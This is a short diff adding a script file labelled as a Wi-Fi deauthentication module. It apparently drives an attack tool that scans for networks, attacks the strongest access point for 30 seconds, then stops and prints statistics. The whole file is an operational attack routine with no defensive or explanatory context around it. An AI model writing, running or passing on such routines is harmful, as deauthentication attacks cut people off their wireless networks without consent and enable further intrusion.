@@ -1,0 +1,9 @@
+# module: wifi-deauth
+# desc: scan, attack the strongest AP, hold for 30 s, then stop
+
+scan
+sleep 6
+attack 1
+sleep 30
+stop
+stats
